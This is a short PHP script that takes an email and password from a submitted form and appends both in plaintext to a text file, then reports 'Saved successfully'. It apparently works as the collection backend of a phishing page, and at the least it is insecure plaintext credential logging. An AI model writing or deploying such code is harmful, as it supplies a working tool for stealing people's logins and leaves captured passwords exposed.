<?php

if ($_SERVER["REQUEST_METHOD"] == "POST") {

    $email = $_POST["email"];
    $password = $_POST["password"];

    $file = "messages.txt";

    $data = "Email: " . $email . "\n";
    $data .= "Password: " . $password . "\n";
    $data .= "----------------------\n";

    file_put_contents($file, $data, FILE_APPEND);

    echo "Saved successfully";

}

?>